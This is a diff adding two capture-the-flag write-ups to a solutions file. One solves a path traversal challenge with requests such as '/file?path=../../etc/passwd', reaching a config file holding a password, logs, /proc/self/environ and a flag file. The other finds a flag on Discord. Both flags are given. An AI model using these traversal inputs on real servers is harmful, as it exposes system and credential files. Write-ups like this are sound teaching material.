@@ -86,3 +86,93 @@ Reading the commit history of a repository.
 ## References 
 None
 
+
+
+# Challenge Name
+Robot's trail
+
+## My solve
+**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`
+
+1. I first did inspect to know more about the website code there I saw `/robots.txt` inside a href tag using that i entered `websiteurl/robots.txt` and found
+```bash
+User-agent: *
+
+# We value our digital privacy and have restricted access to certain system-level configurations.
+Disallow: /file?path=../../etc/passwd
+Disallow: /file?path=../../../etc/passwd
+
+# Hint for curious explorers: 
+# Sometimes system files like /etc/passwd can reveal interesting information...
+# But remember to respect privacy boundaries!
+```
+Now I knew that we had to do url manipulation to finally get to the page which will give me the flag. So I told chatgpt all the relevant info and asked it for all possible urls that will take me to the final page containing the flag. Firstly I went to `/file?path=../../etc/passwd` this gave me 
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+webadmin:x:1000:1000:Check the web server config at /var/www/html/config.php:/home/webadmin:/bin/bash
+```
+Now trying various commands and stuff I progressed in the following way:
+```bash
+<?php
+// Database configuration
+$db_host = 'localhost';
+$db_user = 'admin';
+$db_pass = 's3cr3t_p@ssw0rd';
+// Debug info: Check the access logs for unusual activity
+// Log location: /var/log/apache2/access.log
+?>
+```
+```bash
+127.0.0.1 - - [01/Jan/2023:10:30:45 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
+192.168.1.100 - - [01/Jan/2023:10:31:22 +0000] "GET /file?path=../../etc/passwd HTTP/1.1" 200 567 "-" "Python-urllib"
+10.0.0.50 - - [01/Jan/2023:10:32:15 +0000] "GET /admin HTTP/1.1" 404 289 "-" "curl"
+# Interesting environment variables might be found at /proc/self/environ
+203.0.113.5 - - [01/Jan/2023:10:33:01 +0000] "POST /login HTTP/1.1" 302 - "-" "Mozilla/5.0"
+```
+```bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=web-server-01
+USER=www-data
+HOME=/var/www
+SECRET_LOCATION=/home/ctf/.secret
+PWD=/var/www/html
+LANG=C.UTF-8
+SHLVL=1
+```
+```bash
+Directory listing for /home/ctf/.secret:
+total 12
+drwx------ 2 ctf ctf 4096 Jan  1 10:00 .
+drwxr-xr-x 5 ctf ctf 4096 Jan  1 09:55 ..
+-r-------- 1 ctf ctf   48 Jan  1 10:00 flag.txt
+```
+```bash
+https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret/flag.txt
+```
+This url finally gave me the flag.
+
+## What I learned
+Basic Searching Through Discord
+
+## References 
+None
+
+
+
+# Challenge Name
+Zahard Welcome
+
+## My solve
+**Flag:** `citadel{7h3_c174d3l_b3ck0n5}`
+
+It told us to visit the place everywhere gathers so I first checked into the general section of the official discord server but in the meanwhile my teammate checked for other sections eventually we got the flag simply pasted in `Rules` Section of Discord.
+
+## What I learned
+Basic Searching Through Discord
+
+## References 
+None
